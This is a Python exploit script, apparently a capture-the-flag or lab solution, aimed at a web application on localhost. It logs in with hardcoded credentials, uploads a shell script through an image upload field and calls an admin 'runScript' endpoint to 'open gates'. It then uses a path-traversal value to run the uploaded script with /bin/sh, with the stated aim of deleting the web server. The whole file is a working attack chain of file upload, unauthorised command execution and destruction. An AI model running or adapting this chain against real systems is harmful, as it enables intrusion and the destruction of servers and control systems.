import requests
session = requests.Session()


# Get PHPSESSID cookie
url = 'http://localhost:8080/'
response = session.get(url)
assert response.status_code == 200
assert "err" not in response.url
assert "err" not in response.text
assert "Permission denied" not in response.text

# Log in
url = 'http://localhost:8080/auth/login'
payload = {'username': 'rekt0r', 'password': '152360752a', 'agreement': 1}
response = session.post(url, data=payload)

assert response.url != 'http://localhost:8080/?err=login'
assert response.status_code == 200
assert "err" not in response.url
assert "err" not in response.text
assert "Permission denied" not in response.text
print("Logged in successfully")


# Upload  script using post
url = 'http://localhost:8080/inside/post/create'
script_name = 'script.sh'
files = {'image': open(script_name ,'rb')}
payload = {'text': 'Automated Script'}
response = session.post(url, files=files, data=payload)
assert response.status_code == 200
assert response.status_code == 200
assert "err" not in response.url
assert "err" not in response.text
assert "Permission denied" not in response.text
print("Script uploaded")

# Fix permissions
url = "http://localhost:8080/admin/runScript"
payload = {'name': 'fix-permissions.sh'}
response = session.post(url, data=payload)
assert response.status_code == 200
assert "err" not in response.url
assert "err" not in response.text
assert "Permission denied" not in response.text

# Open gates
payload = {'name': 'gates-control.sh open'}
response = session.post(url, data=payload)
assert response.status_code == 200
assert "err" not in response.url
assert "err" not in response.text
assert "Permission denied" not in response.text
print('Gates are open now')

# Delete web server
payload = {'name': '../../../../../bin/sh /var/www/userupload/posts/script.sh'}
response = session.post(url, data=payload)
assert response.status_code == 200
assert "err" not in response.url
assert "Permission denied" not in response.text
print("Web server deleted")